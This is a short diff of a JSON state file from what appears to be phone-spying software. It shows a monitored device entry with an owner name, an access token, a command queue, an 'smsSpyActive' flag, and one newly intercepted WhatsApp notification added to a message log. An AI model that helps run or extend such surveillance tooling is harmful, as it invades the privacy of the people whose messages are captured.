@@ -1245,7 +1245,7 @@
     "deviceName": "HP-FREE-A487",
     "ownerUsername": "rian",
     "token": "77751522caef94e9c9f1117d03601776",
-    "lastSeen": 1775189312180,
+    "lastSeen": 1775189318108,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T03:51:21.437Z",
@@ -1261,6 +1261,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎43 pesan dari 2 chat",
+        "time": "03/04 11:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189320164
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
